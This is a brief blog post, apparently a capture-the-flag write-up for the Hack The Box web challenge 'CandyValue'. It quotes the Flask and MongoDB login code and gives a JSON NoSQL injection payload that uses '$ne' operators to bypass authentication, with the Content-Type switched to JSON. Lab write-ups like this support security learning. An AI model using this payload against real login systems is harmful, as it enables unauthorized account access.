---
layout: post
title:  "CandyValue"
date:   2025-04-10 16:10:00 -0400
categories: HTB-challenge web very-easy
tags: HTB CTF writeup sql-injection
---

### SOLUTION
By analyzing the code, we can see the web uses `MongoDB` and its `Content-Type`.
```
from pymongo import MongoClient

app = Flask(__name__)
app.config.from_object("application.config.Config")
bcrypt = Bcrypt(app)

client = MongoClient(app.config["MONGO_URI"])
db = client[app.config["DB_NAME"]]
users_collection = db["users"]

@app.errorhandler(Exception)
def handle_error(error):
    message = error.description if hasattr(error, "description") else [str(x) for x in error.args]
    
    response = {
        "error": {
            "type": error.__class__.__name__,
            "message": message
        }
    }

    return response, error.code if hasattr(error, "code") else 500


@app.route("/", methods=["GET"])
def index():
    return render_template("index.html")


@app.route("/login", methods=["POST"])
def login():
    content_type = request.headers.get("Content-Type")

    if content_type == "application/x-www-form-urlencoded":
        email = request.form.get("email")
        password = request.form.get("password")

    elif content_type == "application/json":
        data = request.get_json()
        email = data.get("email")
        password = data.get("password")
```

Search for `Payloads for MongoDB bypass login`.
![](assets/img/htb/candyvalue/1.png)

```
{
"email": {
"$ne": "invalid"
},
"password": {
"$ne": "invalid"
}
}
```

Now we need to change content-type to `application/json` and add payload to data.
![](assets/img/htb/candyvalue/2.png)
